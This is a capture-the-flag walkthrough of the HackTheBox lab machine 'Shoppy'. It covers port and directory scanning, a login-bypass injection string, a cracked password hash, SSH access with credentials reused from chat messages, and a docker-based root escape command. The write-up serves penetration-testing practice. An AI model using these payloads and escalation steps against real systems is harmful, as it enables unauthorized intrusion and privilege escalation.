---
title: <img width="50" height="50" alt="front-page port 80-shoopyu" src="https://user-images.githubusercontent.com/95465072/209339137-7cdb2cf0-2ee2-4941-b213-1f796eb4f4ef.png"> Shoppy | HackTheBox | Easy
date: 2022-11-12 00:00:02 +240
categories: [Write Up, HackTheBox]
tags: [write up, hackthebox, ctf, easy, walkthrough, web, http, sqli, docker, gtfobins, shoppy,  machine] # TAG names should always be lowercase

---

-------------------

![Shoppy Walkthrough](https://user-images.githubusercontent.com/95465072/208251441-d736be8b-c137-42f1-a5ce-34669d343e8b.jpg)


## Reconnaissance

```sh
nmap -sV -sC <target-ip>
```

### Results
```
Starting Nmap 7.93 ( https://nmap.org ) at 2022-12-15 21:13 EST
Nmap scan report for 10.10.11.180
Host is up (0.14s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey: 
|   3072 9e5e8351d99f89ea471a12eb81f922c0 (RSA)
|   256 5857eeeb0650037c8463d7a3415b1ad5 (ECDSA)
|_  256 3e9d0a4290443860b3b62ce9bd9a6754 (ED25519)
80/tcp open  http    nginx 1.23.1
|_http-title: Did not follow redirect to http://shoppy.htb
|_http-server-header: nginx/1.23.1
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 15.92 seconds
```

<img width="739" alt="front-page port 80-shoopyu" src="https://user-images.githubusercontent.com/95465072/208038135-3a3146ef-cbd2-48e8-8cb2-5cdc1b42f948.png">



&nbsp;

> Look like there's nothing much usefull!!


## Directory bruteforcing

```sh
gobuster dir -b 404,301 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 500 -u http://shoppy.htb
```

### Results:
```
                                                                                                       
┌──(root㉿kali/machines/shoppy-HTB)
[
└─# gobuster dir -b 404,301 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 500 -u http://shoppy.htb
===============================================================
Gobuster v3.3
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://shoppy.htb
[+] Method:                  GET
[+] Threads:                 500
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404,301
[+] User Agent:              gobuster/3.3
[+] Timeout:                 10s
===============================================================
2022/12/16 00:46:53 Starting gobuster in directory enumeration mode
===============================================================
/admin                (Status: 302) [Size: 28] [--> /login]
/login                (Status: 200) [Size: 1074]
/Login                (Status: 200) [Size: 1074]
Progress: 3984 / 220561 (1.81%)^C
[!] Keyboard interrupt detected, terminating.
===============================================================
2022/12/16 00:46:58 Finished
===============================================================
```

We got **login and admin page on shoppy.htb**
<img width="417" alt="shoppy-login-80" src="https://user-images.githubusercontent.com/95465072/208038273-00971ffe-e7f7-4b79-9614-84350516e642.png">


Let's try sqli here!

username : ```admin'||'1==1```
password : ```random```

**Boom!! we logged in**

try out again the same sqli here!

```admin'||'1==1```

<img width="520" alt="sqli-after-admin" src="https://user-images.githubusercontent.com/95465072/208038413-8b3e3f82-e8f5-4f4f-b8d5-9a3264871104.png">


Download the transcirpt!

great! we got **josh** user's password hash

<img width="461" alt="pass-user-afteradmin-download" src="https://user-images.githubusercontent.com/95465072/208038531-1e1741e0-9ce4-438d-9de1-db802d67c5e6.png">

[crack this hash here](https://crackstation.net/)

<img width="786" alt="hash-for-josh" src="https://user-images.githubusercontent.com/95465072/208038459-27930a24-ad73-43b6-ae02-44f679fefe1e.png">


|hash|password  |
|--|--|
|  6ebcea65320589ca4f2f1ce039975995| remembermethisway |

## Subdomain Enumeration
```sh
gobuster vhost -w /usr/share/wordlists/SecLists/bitquark-subdomains-top100000.txt -t 50 -u shoppy.htb --no-error
```

### Results: 
```
┌──(root㉿kali)-[/usr/share/wordlists/SecLists]
└─# gobuster vhost -w /usr/share/wordlists/SecLists/bitquark-subdomains-top100000.txt -t 50 -u shoppy.htb --no-error
===============================================================
Gobuster v3.3
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:             http://shoppy.htb
[+] Method:          GET
[+] Threads:         50
[+] Wordlist:        /usr/share/wordlists/SecLists/bitquark-subdomains-top100000.txt
[+] User Agent:      gobuster/3.3
[+] Timeout:         10s
[+] Append Domain:   false
===============================================================
2022/12/16 01:08:10 Starting gobuster in VHOST enumeration mode
===============================================================
mattermost                (Status: 200) [Size: 1074]
```

We got the subdomain **http://mattermost.shoppy.htb** add this to **/etc/hosts**


login as josh

<img width="956" alt="logged-in-as-josh" src="https://user-images.githubusercontent.com/95465072/208038659-fd645b6d-e9b4-4a3e-99dc-74d5901211c7.png">

username **josh**
password **remembermethisway**

> Boom! in the comments section we got

<img width="644" alt="comments" src="https://user-images.githubusercontent.com/95465072/208038717-e92f1f9c-0a2c-4c6e-8b01-c5c6814a973f.png">
```
jaeger
4:22 AM

Hey @josh,
For the deploy machine, you can create an account with these creds :
username: jaeger
password: Sh0ppyBest@pp!
And deploy on it.
```

Based on this comment we can try **ssh**

```sh
ssh jaeger@shoppy.htb
```
**password : ```Sh0ppyBest@pp!```**

<img width="515" alt="loggedinas-jaeger-ssh" src="https://user-images.githubusercontent.com/95465072/208038891-6bb20313-7993-48d8-a698-86776636dc99.png">
ge >

# Got the user flag!!

```
jaeger@shoppy:~$ ls
Desktop  Music  ShoppyApp  user.txt
Documents  Pictures  shoppy_start.sh  Videos
Downloads  Public  Templates
jaeger@shoppy:~$ cat user.txt
3056a9074c4c2bd189e9************
jaeger@shoppy:~$
```

## Privilege Escalation

```sh
sudo -l 
```
<img width="509" alt="sudo-l" src="https://user-images.githubusercontent.com/95465072/208039030-c68a2b91-3b9c-445a-91b3-7878b91cf1b8.png">


By this we can see that we can execute password-manager as root user!

```sh
cat /home/deploy/password-manager
```
``` sudo -u deploy /home/deploy/password-manager```

 <img width="510" alt="deployed-successfully" src="https://user-images.githubusercontent.com/95465072/208039092-98434b3f-7c96-4277-b893-fb8fd4c74aa0.png">


### Try this with ssh again

```ssh deploy@shoppy.htb```
**password : ```Deploying@pp!```**



 It looks like we are in the docker container! 
 **let's try it out with gtfobins payload for sudo**
  
  [gtfobins --> docker --> sudo ](https://gtfobins.github.io/gtfobins/docker/#sudo)


```
docker run -v /:/mnt --rm -it alpine chroot /mnt sh
```

# Congragulations!! got the root flag!

### Root.txt
```d9dd59daa7341501bb93c****************```
<img width="592" alt="shoppy-pawned" src="https://user-images.githubusercontent.com/95465072/208039202-9774e554-d6bf-4691-9210-fdf3d522e7ee.png">
